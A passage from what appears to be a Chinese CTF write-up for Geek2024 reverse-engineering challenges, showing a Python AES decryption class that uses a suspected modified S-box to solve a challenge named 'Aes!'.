cipher.decrypt(ciphertext)<br><br><span class="hljs-comment"># 去除填充（PKCS#7）</span><br>pad_len = decrypted[-<span class="hljs-number">1</span>]<br>plaintext = decrypted[:-pad_len]<br><br><br><span class="hljs-built_in">print</span>(plaintext.decode())<br></code></pre></td></tr></table></figure><h2 id="Aes"><a href="#Aes" class="headerlink" title="Aes!"></a>Aes!</h2><p>标准aes，直接解密不对，跟踪一下流程发现没别的操作或者修改数据</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731741693528-d3ecf475-b878-4591-8537-5223d5d0aab2.png" class="" title="img"><p>findcrypt一下发现没识别到，大概率可能是修改了s盒</p><p>用一下修改s盒的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">IAES</span>:<br>    <span class="hljs-keyword">global</span> new_s_box<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Nk = <span class="hljs-number">4</span><br>        self.Nb = <span class="hljs-number">4</span><br>        self.Nr = <span class="hljs-number">10</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Nb = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Nb = Nb + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Nb<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Inv_arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Inv_raws = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Inv_raws = Inv_raws + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Inv_raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">self, raws</span>):<br>        raws = self.Inv_arrays(raws)<br>        raws = <span class="hljs-string">&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> raws])<br>        <span class="hljs-comment">#print(raws)</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view2</span>(<span class="hljs-params">self, <span class="hljs-built_in">list</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">format</span>(<span class="hljs-built_in">list</span>[i], <span class="hljs-string">&#x27;2x&#x27;</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">3</span> == <span class="hljs-number">3</span>:  <span class="hljs-comment"># i%4 == 3</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-comment">#print(&#x27;\n&#x27;, end=&#x27;&#x27;)</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">AddRoundKey</span>(<span class="hljs-params">self, raws, Keys</span>):<br>        AddRoundKey = []<br>        <span class="hljs-keyword">for</span> raw, Key <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(raws, Keys):<br>            AddRoundKey.append(raw ^ Key)<br>        <span class="hljs-keyword">return</span> AddRoundKey<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubBytes</span>(<span class="hljs-params">self, raws</span>):<br>        S_box=new_s_box<br>        raws_S_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_S_box.append(S_box[raw])<br>        <span class="hljs-keyword">return</span> raws_S_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvSubBytes</span>(<span class="hljs-params">self, raws,inv_s_box</span>):<br>        IS_box = inv_s_box<br>        raws_IS_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_IS_box.append(IS_box[raw])<br>        <span class="hljs-keyword">return</span> raws_IS_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvShiftRows</span>(<span class="hljs-params">self, raws</span>):<br>        s13 = raws.pop(<span class="hljs-number">7</span>)<br>        raws.insert(<span class="hljs-number">4</span>, s13)<br>        s2223 = raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        raws[<span class="hljs-number">8</span>:<span class="hljs-number">0</span>] = s2223<br>        s313233 = raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        raws[<span class="hljs-number">12</span>:<span class="hljs-number">0</span>] = s313233<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GMUL</span>(<span class="hljs-params">self, a, b</span>):  <span class="hljs-comment"># Russian Peasant Multiplication algorithm</span><br>        p = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> a <span class="hljs-keyword">and</span> b:<br>            <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:  <span class="hljs-comment"># b%2</span><br>                p = p ^ a<br>            <span class="hljs-keyword">if</span> a &amp; <span class="hljs-number">0x80</span>:  <span class="hljs-comment"># a=a*x^7(a&gt;0),a &gt;= 2**7(128)</span><br>                a = (a &lt;&lt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0x11b</span>  <span class="hljs-comment"># 0x11b = x^8 + x^4 + x^3 + x + 1 (0b100011011)</span><br>            <span class="hljs-keyword">else</span>:<br>                a = a &lt;&lt; <span class="hljs-number">1</span><br>            b = b &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvMixColumns</span>(<span class="hljs-params">self, raws</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i] \<br>                = \<br>                self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i])<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">RotWord</span>(<span class="hljs-params">self, temp</span>):<br>        b0 = temp.pop(<span class="hljs-number">0</span>)<br>        temp.insert(<span class="hljs-number">3</span>, b0)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubWord</span>(<span class="hljs-params">self, temp</span>):<br>        temp = self.SubBytes(temp)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyExpansion</span>(<span class="hljs-params">self, key</span>):<br>        i = <span class="hljs-number">0</span><br>        w = [[<span class="hljs-number">0</span>]] * (self.Nb * (self.Nr + <span class="hljs-number">1</span>))<br>        Rcon = [[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br>                ]<br>        <span class="hljs-keyword">while</span> i &lt; self.Nk:<br>            w[i] = ([key[<span class="hljs-number">4</span> * i], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]])<br>            i = i + <span class="hljs-number">1</span><br><br>        i = self.Nk<br><br>        <span class="hljs-keyword">while</span> i &lt; self.Nb * (self.Nr + <span class="hljs-number">1</span>):<br>            temp = w[i - <span class="hljs-number">1</span>].copy()<br>            <span class="hljs-keyword">if</span> i % self.Nk == <span class="hljs-number">0</span>:<br>                temp = self.SubWord(self.RotWord(temp))<br>                temp2 = []<br>                <span class="hljs-keyword">for</span> temp1, Rcon1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(temp, Rcon[(i // self.Nk) - <span class="hljs-number">1</span>]):<br>                    temp2.append(temp1 ^ Rcon1)<br>                temp = temp2<br>            <span class="hljs-keyword">elif</span> self.Nk &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> i % self.Nk == <span class="hljs-number">4</span>:<br>                temp = self.SubWord(temp)<br>            w_temp = []<br>            <span class="hljs-keyword">for</span> w1, temp1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(w[i - self.Nk], temp):<br>                w_temp.append(w1 ^ temp1)<br>            w[i] = w_temp<br>            i = i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> w<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">IAES</span>(<span class="hljs-params">self, IInput, Cipher_Key,inv_s_box</span>):<br>        IInput = [IInput1 <span class="hljs-keyword">for</span> IInput1 <span class="hljs-keyword">in</span> IInput]<br>        Cipher_Key = [Cipher_Key1 <span class="hljs-keyword">for</span> Cipher_Key1 <span class="hljs-keyword">in</span> Cipher_Key]<br>        KeyExpansion = self.KeyExpansion(Cipher_Key)<br>        keys = []<br>        <span class="hljs-keyword">for</span> Key_index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(KeyExpansion) // <span class="hljs-number">4</span>):<br>            keys_temp = (KeyExpansion[<span class="hljs-number">4</span> * Key_index] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">1</span>] + KeyExpansion[<br>                <span class="hljs-number">4</span> * Key_index + <span class="hljs-number">2</span>] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">3</span>])<br>            keys_temp = self.arrays(keys_temp)<br>            keys.append(keys_temp)<br>        IInput = self.arrays(IInput)<br>        self.view(IInput)<br>        self.view(keys[-<span class="hljs-number">1</span>])<br>        IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span>])<br>        self.view(IInput)<br>        <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.Nr - <span class="hljs-number">1</span>):<br>            IInput = self.InvShiftRows(IInput)<br>            self.view(IInput)<br>            IInput = self.InvSubBytes(IInput,inv_s_box)<br>            self.view(IInput)<br>            self.view(keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            self.view(IInput)<br>            IInput = self.InvMixColumns(IInput)<br>            self.view(IInput)<br>        IInput = self.InvShiftRows(IInput)<br>        self.view(IInput)<br>        IInput = self.InvSubBytes(IInput,inv_s_box)<br>        self.view(IInput)<br>        self.view(keys[<span class="hljs-number">0</span>])<br>        IInput = self.AddRoundKey(IInput, keys[<span class="hljs-number">0</span>])<br>        self.view(IInput)<br>        IInput = self.Inv_arrays(IInput)<br>        IInput = <span class="hljs-built_in">bytes</span>(IInput)<br>        <span class="hljs-keyword">return</span> IInput<br><br><br>S_box = [<br>    <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>    <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>    <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>    <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>    <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>    <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>    <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>    <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>    <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>    <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>    <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>    <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>    <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span 